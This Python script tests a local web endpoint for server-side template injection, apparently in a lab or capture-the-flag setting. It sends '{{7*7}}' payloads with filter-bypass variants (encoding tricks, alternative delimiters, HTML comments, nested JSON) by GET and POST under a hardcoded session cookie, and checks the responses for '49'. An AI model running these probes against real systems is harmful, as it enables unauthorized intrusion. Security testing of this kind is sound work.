import requests
import json
import urllib.parse

target_url = "http://127.0.0.1:32790/total_loan_payments"
session_cookie = "session=eyJ1c2VyX2lkIjoxfQ.aVlvKQ.Ahoc9Ula-DnHQaF2W1Cj0InvBaA"
headers = {
    "Cookie": session_cookie,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

print("Testing /total_loan_payments for template bypass")
print("="*60)

# Test GET requests
payloads = {
    "original": "{{7*7}}",
    "html_comment": "<!--{{7*7}}-->",
    "string_concat": "{{'{{' + '7*7' + '}}'}}",
    "fragmented": "{{7*7 }}",
    "alternative_delim": "${7*7}",
    "url_encoded_std": "%7B%7B7*7%7D%7D",
    "url_encoded_aggressive": "%25257B%25257B7*72525257D%25257D",
    "nested_json": '{"key": "{{7*7}}"}'
}

results = []

print("\n[+] GET Tests")
for name, payload in payloads.items():
    try:
        encoded = urllib.parse.quote(payload)
        url = f"{target_url}?param={encoded}"
        resp = requests.get(url, headers=headers, timeout=10)
        
        executed = "49" in resp.text
        filtered = any(word in resp.text.lower() for word in ["forbidden", "blocked", "denied"])
        
        print(f"\n{name}: Status={resp.status_code}")
        print(f"  Filtered: {filtered} | Executed: {executed}")
        if executed:
            print(f"  [!] TEMPLATE EXECUTED - Found '49'")
        if filtered:
            print(f"  [!] FILTER TRIGGERED")
        print(f"  Response: {resp.text[:200]}")
        
        results.append({"name": name, "method": "GET", "status": resp.status_code, "executed": executed, "filtered": filtered})
    except Exception as e:
        print(f"  Error: {e}")

print("\n[+] POST Tests")
json_headers = headers.copy()
json_headers["Content-Type"] = "application/json"

for name, payload in payloads.items():
    try:
        if name == "nested_json":
            data = json.loads(payload)
        else:
            data = {"param": payload}
            
        resp = requests.post(target_url, headers=json_headers, json=data, timeout=10)
        
        executed = "49" in resp.text
        filtered = any(word in resp.text.lower() for word in ["forbidden", "blocked", "denied"])
        
        print(f"\n{name}: Status={resp.status_code}")
        print(f"  Filtered: {filtered} | Executed: {executed}")
        if executed:
            print(f"  [!] TEMPLATE EXECUTED - Found '49'")
        if filtered:
            print(f"  [!] FILTER TRIGGERED")
        print(f"  Response: {resp.text[:200]}")
        
        results.append({"name": name, "method": "POST", "status": resp.status_code, "executed": executed, "filtered": filtered})
    except Exception as e:
        print(f"  Error: {e}")

# Summary
print("\n" + "="*60)
print("SUMMARY")
print("="*60)
executed_count = sum(1 for r in results if r["executed"])
filtered_count = sum(1 for r in results if r["filtered"])
print(f"Total tests: {len(results)}")
print(f"Template executed: {executed_count}")
print(f"Filter triggered: {filtered_count}")

if executed_count > 0:
    executed_tests = [(r["name"], r["method"]) for r in results if r["executed"]]
    print(f"\n[!] TEMPLATE EXECUTION FOUND in:")
    for name, method in executed_tests:
        print(f"  - {name} ({method})")
else:
    print("\n[-] No template execution detected")
